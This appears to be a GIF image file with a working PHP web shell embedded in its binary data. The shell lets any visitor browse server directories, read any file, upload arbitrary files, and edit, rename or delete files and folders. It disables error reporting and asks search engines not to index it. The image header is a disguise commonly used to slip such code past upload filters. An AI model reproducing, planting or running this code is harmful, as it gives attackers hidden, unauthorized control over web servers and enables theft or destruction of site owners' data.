GIF89a;
ï¿½Tï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½yï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½hï¿½ï¿½ï¿½ï¿½Í‰`|ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ô™ï¿½×§ï¿½ï¿½ï¿½Í­]jï¿½ï¿½ï¿½ï¿½xÖ¹lï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÈÇ­gOfmï¿½ï¿½ï¿½ï¿½ï¿½xï¿½ï¿½|Lbhï¿½Ã‡Ù¼qQ|ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ù›ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½~ï¿½ï¿½ï¿½ï¿½ÑŒï¿½ï¿½ï¿½ï¿½ÉƒÔ·iï¿½ï¿½ï¿½Ì±iï¿½ï¿½Zï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½pYrzPzï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÜµÚ¾tÐ±aÓºtÇºï¿½ï¿½ï¿½'ï¿½ï¿½ï¿½ï¿½ï¿½vï¿½ï¿½6_zï¿½ï¿½Þ¦ï¿½ï¿½ï¿½<ehï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê´r[u|Vnuï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ripï¿½ï¿½ï¿½I^d\v~ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò´eï¿½ï¿½Vï¿½ï¿½Cï¿½ï¿½U|ï¿½nï¿½Ç€Ù·Xï¿½ï¿½ï¿½ishï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Sï¿½ï¿½ï¿½tï¿½ï¿½ï¿½×ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ì‡ï¿½ï¿½Dï¿½ì±³ï¿½:^yï¿½ï¿½ï¿½ï¿½Æ–1ï¿½ï¿½ï¿½ï¿½ï¿½gï¿½ï¿½ï¿½ß«Aï¿½Í„ï¿½ï¿½ï¿½Qyï¿½ï¿½ï¿½ï¿½×ºnï¿½ï¿½ï¿½ï¿½ï¿½Å£ï¿½R0QTï¿½Ê…Ô½zï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½~ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½\ï¿½ï¿½ï¿½ÕªMOxï¿½ï¿½ï¿½ï¿½Ä¤Rï¿½ï¿½ï¿½Ñ²cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ù¿xï¿½ï¿½Ã­ï¿½Jï¿½ï¿½ï¿½ï¿½ï¿½6ï¿½ï¿½pcÓ”ï¿½ï¿½ï¿½
[
ï¿½`
[ï¿½e]ï¿½ pï¿½t0	Zï¿½ï¿½~ï¿½~ï¿½ï¿½ï¿½~&xË€ï¿½$vhï¿½ï¿½k,Xï¿½PP:p/ï¿½0ï¿½3X	upï¿½ï¿½ï¿½ï¿½"ï¿½ï¿½Bï¿½ZE7,ï¿½1
ï¿½ZKhï¿½`lAZï¿½	ï¿½;ï¿½ï¿½gï¿½Wï¿½ï¿½ï¿½u%ï¿½ï¿½vï¿½ï¿½I+ï¿½O0ï¿½ï¿½ï¿½Gï¿½0Ë—	2ï¿½zï¿½ï¿½ï¿½vË–~pQ[K0wï¿½PVï¿½ "ï¿½ï¿½ZPï¿½V	ï¿½hï¿½ï¿½ï¿½Â¸Pï¿½ï¿½^ï¿½Gï¿½\ï¿½ï¿½;ï¿½ï¿½hbÈ‚ï¿½:ï¿½X*tí†ï¿½ï¿½ï¿½4ï¿½vï¿½fiï¿½ÈŠï¿½0q@ï¿½ï¿½ï¿½ï¿½ï¿½v8ï¿½qGï¿½&ï¿½ï¿½ï¿½Xï¿½VØˆï¿½Hï¿½ï¿½ï¿½
ï¿½Frï¿½hIÐŒï¿½EeaÈ‚,H$Eï¿½4/ï¿½ï¿½k8ï¿½5ï¿½|bï¿½ï¿½ Ò·pï¿½ï¿½(ï¿½
ï¿½ï¿½ï¿½hï¿½ï¿½Psï¿½`ï¿½ï¿½(ï¿½ï¿½Hï¿½ï¿½xï¿½(Iï¿½ï¿½ï¿½ï¿½ï¿½P0yï¿½Voï¿½Hï¿½ï¿½
ï¿½V-ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½uCc1PpqtYï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½uï¿½ï¿½ï¿½8ï¿½(ï¿½
--ï¿½ï¿½ï¿½ï¿½*ï¿½,ï¿½ Eï¿½Pï¿½ï¿½[ih<9ï¿½>ï¿½ï¿½ï¿½c	0ï¿½ï¿½2(ï¿½A Lï¿½ï¿½Hï¿½ï¿½(ï¿½RI;Wï¿½cÃ•Tï¿½ï¿½ï¿½ï¿½Ù˜ï¿½ï¿½ï¿½ï¿½ï¿½{0ï¿½ï¿½)ï¿½ ~ï¿½cï¿½7ï¿½ï¿½ï¿½ï¿½0ï¿½ï¿½ï¿½ï¿½yï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ùšï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Pï¿½pï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½	ï¿½F ï¿½Lï¿½hï¿½Æƒï¿½Èï¿½Æƒï¿½È\ÈŒ,ï¿½olï¿½m\ÉÉ™ï¿½ï¿½_ï¿½rEb_Wï¿½ï¿½`ï¿½ï¿½ï¿½|ï¿½f`ï¿½Ë¯ï¿½ï¿½ï¿½ï¿½f<ï¿½ï¿½)ï¿½ï¿½%0ï¿½~ËŠ0ï¿½,Ë¨Lï¿½ï¿½ï¿½ï¿½ï¿½,ï¿½ï¿½ï¿½Êµï¿½Êªï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Êª|ï¿½ÍœÌ°,ï¿½g|Ê¯ï¿½Ê¯,Ì²ï¿½ï¿½ï¿½,ï¿½Û¬Ì­ï¿½ï¿½ï¿½<ï¿½ï¿½Lï¿½ÝœÊµï¿½ï¿½ï¿½ï¿½Ì§ï¿½ï¿½é¨¦ï¿½
ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½`/ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
Ñµï¿½ï¿½ï¿½@ï¿½]ï¿½ï¿½ï¿½}ï¿½mï¿½=ï¿½mï¿½ï¿½ï¿½ï¿½|ï¿½'ï¿½ï¿½ï¿½,ï¿½=ï¿½ï¿½ï¿½+ï¿½ï¿½@ï¿½aï¿½ï¿½QEï¿½ï¿½](ï¿½9ï¿½ï¿½ï¿½ï¿½
ï¿½pÑœï¿½ï¿½Aï¿½?ï¿½ï¿½<
Ô@ï¿½Ä¹ï¿½	ï¿½Ô¤ï¿½	Tï¿½ï¿½9ï¿½S-ï¿½A}Ñ¤ï¿½ï¿½<ï¿½ï¿½Vï¿½ï¿½B}ï¿½Gï¿½ï¿½C
ÔŽ0Ô¤ï¿½ï¿½Rï¿½ï¿½S]Yï¿½ï¿½\ï¿½	Xï¿½ï¿½gï¿½ï¿½(ï¿½ï¿½`ï¿½
g]ï¿½gï¿½ï¿½ï¿½0ï¿½wï¿½Ó¤ï¿½_ï¿½
pMï¿½ï¿½ï¿½ï¿½VMï¿½V=ï¿½QÖ¼FUï¿½mï¿½`ÙœPÙš}Ù—ï¿½ï¿½ï¿½Ùœï¿½	ï¿½ï¿½=Ú†ï¿½
ï¿½0ï¿½ï¿½@X&ï¿½ï¿½ï¿½iï¿½Ù³ï¿½Ù
ÚšmÙ=Ú mÚ²mÙ±=Ú¦-Üï¿½Û¢ï¿½ï¿½ ï¿½ï¿½mØ¸ï¿½Ùœï¿½ï¿½ï¿½Mï¿½ÒÛŸ]ï¿½ï¿½-Ü¿mÝ¶ï¿½ï¿½ï¿½mÛ†ï¿½ï¿½Å¸ï¿½ï¿½ï¿½ï¿½Eï¿½pï¿½ï¿½}ï¿½ï¿½ï¿½ï¿½'ï¿½ï¿½p'ï¿½Âï¿½ï¿½ï¿½ï¿½ï¿½ï¿½tï¿½`
-ï¿½ï¿½}ï¿½ï¿½ï¿½ï¿½]ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½]ï¿½ï¿½ï¿½ï¿½ï¿½Mï¿½ï¿½ï¿½ ï¿½ï¿½mï¿½ï¿½=ï¿½Nï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½^ï¿½Uhï¿½GÞ”@	ï¿½ï¿½Mï¿½2.ï¿½3ï¿½ï¿½:ï¿½7ï¿½ï¿½ï¿½-ï¿½KmFï¿½ï¿½0=ï¿½ï¿½9nï¿½3ï¿½ï¿½5nï¿½<ï¿½ï¿½O~ï¿½QNï¿½I~ï¿½8ï¿½ï¿½I.ï¿½Gï¿½ï¿½Nï¿½ï¿½7ï¿½ï¿½ï¿½ï¿½V.ï¿½:^ï¿½\ï¿½ï¿½O^ï¿½Pï¿½,b5Eï¿½	ï¿½ï¿½ï¿½ ï¿½.ï¿½1ï¿½ï¿½x^ï¿½ï¿½@ï¿½rï¿½ï¿½tï¿½ï¿½Pï¿½ï¿½ï¿½ï¿½ï¿½>ï¿½ï¿½ï¿½ï¿½Pï¿½|ï¿½ï¿½ï¿½Nï¿½snï¿½ï¿½>ï¿½w.ç“¾ï¿½ï¿½~ï¿½zï¿½ï¿½<ï¿½ï¿½ï¿½Nï¿½{ï¿½ï¿½uï¿½ï¿½ï¿½~ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½~ï¿½ï¿½<Nï¿½ï¿½Nè£®ï¿½ï¿½>ï¿½>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½sï¿½æ¸¦ï¿½ï¿½ï¿½qï¿½	D`ï¿½ï¿½ D@ï¿½~ï¿½ï¿½.uï¿½ï¿½Î¾ï¿½ï¿½ï¿½ï¿½Õžï¿½ï¿½ï¿½ï¿½.0ï¿½ï¿½ï¿½nï¿½ï¿½ï¿½ï¿½Nï¿½ï¿½.ï¿½Nï¿½ï¿½nï¿½Ê¾ï¿½Ñžï¿½Ôžï¿½ï¿½ï¿½ï¿½Õžï¿½ï¿½Nï¿½ï¿½ï¿½ï¿½.ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò®ï¿½ÇŽï¿½ï¿½ï¿½ï¿½ï¿½~ï¿½ÉŽï¿½ï¿½ï¿½ï¿½nï¿½×žï¿½_ï¿½ï¿½ï¿½ï¿½,n@R<html>TEST<?php
set_time_limit(0);
error_reporting(0);
if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){$_POST[$key] = stripslashes($value);}}
?>
<!DOCTYPE html><html><head>
<meta name="robots" content="noindex,nofollow">
<link href="" rel="stylesheet" type="text/css"><title></title>
<style type="text/css">body{background: #1C1615;color:#eceff1;font-family:'Verdana';margin:0;font-size: 14px;}h1{font-family:'verdana';font-weight:normal;font-size:60px;margin:0;}h1:hover{color:#ffee58;}select{background:white;color:#4C3A36;}a{color:white;text-decoration:none;font-family:'Verdana'}textarea{width:900px;height:250px;background:transparent;border:1px dashed white;color:white;padding:2px;}tr.first{border-bottom:1px dashed white;}tr:hover{background: #4C3A36;}th{background: #4C3A36;padding:5px;}</style>
</head><body> <?php echo'<div style="color:white;margin-top:0;"><br><center><h2><br></center></h2></div>';
if(isset($_GET['path'])) {$path = $_GET['path'];chdir($_GET['path']);} else {$path = getcwd();}
$path = str_replace("\\","/",$path);$paths = explode("/", $path);
echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td>';echo "<font style='font-size:13px;'>Path: ";
foreach($paths as $id => $pat) {echo "<a style='font-size:13px;' href='?path=";
for($i = 0; $i <= $id; $i++) {echo $paths[$i];
if($i != $id) {echo "/";} }echo "'>$pat</a>/";}
echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:white;margin-bottom:4px;"/>
<input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<center><font color="#00ff00">Upload OK!</font></center><br/>';}
else{echo '<center><font color="white">Upload Failed!</font></center><br/>';}}
echo '</td></tr><tr><td></table>';
if(isset($_GET['filesrc'])){
echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';echo "".basename($_GET['filesrc']);"";echo '</tr></td></table><br />';echo("<center><textarea readonly=''>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea></center>");}
elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<center><font color="#00ff00">Rename OK!</font></center><br />';
}else{
echo '<center><font color="white">Rename Failed!</font></center><br />';
} $_POST['name'] = $_POST['newname'];}
echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');if(fwrite($fp,$_POST['src'])){echo '<center><font color="#00ff00">Edit File OK!</font></center><br />';
}else{echo '<center><font color="white">Edit File Failed!</font></center><br />';}fclose($fp);}
echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';}echo '</center>';}else{echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
}else{echo '<center><font color="white">Delete Dir Failed!</font></center><br />';}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){echo '<font color="#00ff00">Delete File Done!</font><br />';}else{
echo '<font color="white">Delete File Error!</font><br />';}}}echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first">
<th><center>Name</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th>
<th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>';
foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr><td>[D] <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
if(is_writable("$path/$dir")) echo '<font color="#00ff00">';
elseif(!is_readable("$path/$dir")) echo '<font color="white">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
echo"</center></td><td><center>".date("d-M-Y H:i", filemtime("$path/$dir"))."";echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
foreach($scandir as $file){if(!is_file("$path/$file")) continue;$size = filesize("$path/$file")/1024;
$size = round($size,3);if($size >= 1024){$size = round($size/1024,2).' MB';}else{$size = $size.' KB';}
echo "<tr><td>[F] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>".$size."</center></td><td><center>";
if(is_writable("$path/$file")) echo '<font color="#00ff00">';
elseif(!is_readable("$path/$file")) echo '<font color="white">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo"</center></td><td><center>".date("d-M-Y H:i",filemtime("$path/$file"))."";
echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
echo '</table></div>';}echo '</body></html>';
function perms($file){$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';} $info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));$info .= (($perms & 0x0004) ? 'r' : '-');$info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));return $info;}
echo'<br><center></center><br>';?>ï¿½/Í 
!ï¿½ï¿½$ï¿½ï¿½_ï¿½ï¿½ï¿½ï¿½Pï¿½ï¿½ï¿½.ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½$/ï¿½ï¿½@ï¿½!?"ï¿½ï¿½ ï¿½
7_ï¿½;oï¿½Rï¿½ï¿½/ï¿½ï¿½~ï¿½Rï¿½ï¿½D?ï¿½*ï¿½ï¿½ï¿½ï¿½ï¿½0ï¿½ï¿½ï¿½Eï¿½ï¿½ï¿½@ï¿½5?ï¿½Dï¿½ï¿½3ï¿½ï¿½=ï¿½:ï¿½ï¿½Mï¿½Pï¿½/?ï¿½!&ï¿½ï¿½Pï¿½@
ï¿½
ï¿½`ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
ï¿½
t?ï¿½ï¿½@
zO
ï¿½ï¿½ï¿½Öxï¿½ï¿½m
nï¿½wï¿½ï¿½mï¿½ï¿½zo
rï¿½ï¿½ï¿½ï¿½xï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½rï¿½ï¿½`ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½oï¿½pï¿½
ï¿½ï¿½yoï¿½ï¿½?ï¿½pï¿½ï¿½ï¿½ï¿½ï¿½ï¿½`ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½wï¿½ï¿½zï¿½ï¿½mï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>ï¿½ï¿½ï¿½_ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½O
_ï¿½ï¿½ï¿½Eï¿½ Ñ  
P
ï¿½ï¿½ï¿½ï¿½Þ¿ï¿½ï¿½_
ï¿½?ï¿½ï¿½/ï¿½Ù¯ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½/ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
ï¿½oï¿½
 ï¿½
$XMA5ï¿½
Txï¿½aï¿½h6ï¿½ï¿½ï¿½Â…1ï¿½ï¿½0cï¿½ï¿½3fï¿½Vï¿½I}ï¿½ï¿½ï¿½bï¿½	J`5ï¿½ï¿½ï¿½Dï¿½ï¿½ï¿½Oiï¿½T@ï¿½gÎœ6i~"ZÓ¦@ï¿½?kï¿½ï¿½ï¿½ï¿½Mï¿½K}JU(Uï¿½IuN
ï¿½ï¿½iÖ¢Aï¿½Fï¿½ï¿½ï¿½ï¿½Ó¡7ï¿½ï¿½dï¿½ï¿½ï¿½Oï¿½nï¿½ï¿½+Õ¢oï¿½ï¿½-[Dï¿½I)Wï¿½|	ï¿½Hï¿½Oï¿½
Aï¿½
ï¿½bÅ;VLï¿½1ï¿½Ëˆï¿½Bï¿½ï¿½sï¿½Ä‘?on\:1ï¿½Å‹ï¿½ï¿½ï¿½9uhÈ§;/ï¿½Mï¿½1ï¿½ï¿½Çœ+ï¿½ï¿½ï¿½ï¿½ï¿½Õ¹+ï¿½ï¿½|2ï¿½ï¿½ï¿½Qï¿½ï¿½ï¿½toh~fI8Iï¿½gÙ¹A-ï¿½3hÜ¸=ï¿½ï¿½3ï¿½pï¿½1gï¿½N~}ï¿½gï¿½ï¿½ï¿½O^ï¿½wï¿½ï¿½ï¿½sï¿½ï¿½~ï¿½ï¿½ï¿½ï¿½Ï½ ï¿½Kï¿½=ï¿½ï¿½9ï¿½ï¿½ï¿½ï¿½ï¿½/ï¿½ï¿½Ü£/ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½>ï¿½ï¿½ï¿½Pï¿½BÈ‹0?Ù£ï¿½?ï¿½ï¿½ï¿½.ï¿½ï¿½BI%[<!ï¿½ï¿½kï¿½ï¿½ï¿½ï¿½
ï¿½ï¿½ï¿½ï¿½aï¿½á±‚
|ï¿½QGpjï¿½ï¿½ï¿½aï¿½Lï¿½ï¿½aï¿½ï¿½ï¿½ï¿½ï¿½Lï¿½ï¿½ï¿½Iï¿½gï¿½ï¿½ï¿½ï¿½!ï¿½ï¿½ï¿½ï¿½"ï¿½irImï¿½qï¿½1k,ï¿½ï¿½#ï¿½)sï¿½aï¿½ï¿½7ï¿½ï¿½FI+ï¿½Tï¿½ï¿½kï¿½ï¿½ï¿½ï¿½!ï¿½42ï¿½8ï¿½'ï¿½
ï¿½<ï¿½rï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½A!%2P!ï¿½lq:ï¿½ï¿½ï¿½"ï¿½	ï¿½ï¿½QE5uï¿½R-uURY=3ï¿½WQ}ï¿½ï¿½VÏœï¿½ï¿½[q5ï¿½V[{ï¿½ï¿½UXEï¿½UX_Uï¿½Uï¿½Rï¿½]5ï¿½\mï¿½Yeï¿½ï¿½uZTï¿½ï¿½Eï¿½ï¿½%PU
ï¿½	 ï¿½eï¿½	oï¿½7Urï¿½-w\Uï¿½U7]xÉ…ï¿½\uÏ­7ï¿½vï¿½mï¿½]vï¿½ï¿½7\~ï¿½5ï¿½ï¿½oï¿½% yï¿½ï¿½ï¿½_ï¿½!Ü‚ï¿½ï¿½ï¿½]ï¿½ï¿½ï¿½[ï¿½ï¿½]ï¿½ï¿½"ï¿½ aï¿½ï¿½ï¿½cï¿½Kï¿½dï¿½Oï¿½cï¿½Yydï¿½Mï¿½eï¿½IVï¿½fï¿½W^ï¿½ï¿½ï¿½Kï¿½ï¿½ï¿½ï¿½kNï¿½dï¿½wï¿½gï¿½eï¿½xï¿½ï¿½kï¿½ï¿½hï¿½q.ï¿½lSï¿½ï¿½ï¿½ï¿½"n ï¿½B~ï¿½ï¿½kBï¿½{ï¿½ï¿½6ï¿½lï¿½ï¿½@lï¿½ï¿½ï¿½zmï¿½ï¿½Öšï¿½ï¿½ï¿½^{ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½&ï¿½ï¿½ï¿½ï¿½ï¿½;ï¿½ï¿½ï¿½Þ»nï¿½ï¿½N\lï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Fï¿½ï¿½ï¿½)O|kï¿½ï¿½6|mï¿½ï¿½ï¿½Ô–ï¿½ï¿½ï¿½ï¿½Sï¿½ï¿½gØ®ï¿½g`ï¿½uBbï¿½ï¿½ï¿½ï¿½e7ï¿½ï¿½ï¿½{\wï¿½Ï½lgï¿½<ï¿½ï¿½
gmï¿½ï¿½/^ï¿½ï¿½ï¿½ï¿½=ï¿½ï¿½Uï¿½ï¿½xï¿½Y?ï¿½vØ‘ï¿½ï¿½ï¿½W?Þ™ï¿½ï¿½Gï¿½ï¿½ï¿½ï¿½=}ï¿½kgï¿½ï¿½3Lï¿½"Xï¿½ï¿½uï¿½ï¿½ï¿½FfXï¿½ï¿½ï¿½ï¿½ï¿½ï¿½+^ï¿½hï¿½ ï¿½ï¿½ï¿½Sï¿½4Øï¿½9ï¿½ï¿½ï¿½_ï¿½ï¿½ï¿½ï¿½Apï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ù¿ï¿½ï¿½tï¿½ï¿½ï¿½ï¿½
ï¿½ï¿½ï¿½ï¿½ 3((A
ï¿½\ï¿½4ï¿½ï¿½
jÐ†ï¿½(aï¿½hï¿½rï¿½ï¿½.byxï¿½ï¿½.[+ï¿½7ï¿½ï¿½ï¿½oxï¿½ï¿½ï¿½ï¿½ï¿½ï¿½AEg8qï¿½ï¿½ï¿½ï¿½Ñi|ï¿½6$ï¿½4ï¿½!ï¿½iHCï¿½ftï¿½7ï¿½ï¿½ï¿½42pï¿½mTcï¿½qï¿½4ï¿½0ï¿½qï¿½ï¿½ï¿½ÈŒ+:Ð†]lï¿½7ï¿½ï¿½
'ï¿½ï¿½ï¿½6tï¿½7ï¿½ï¿½ï¿½/vï¿½ï¿½ï¿½Lc7ï¿½ï¿½Coï¿½ï¿½Zï¿½cï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½pï¿½ï¿½JCï¿½ï¿½ï¿½ï¿½ï¿½ï¿½xï¿½<ï¿½ï¿½ï¿½Gï¿½_9@F"ï¿½E ;
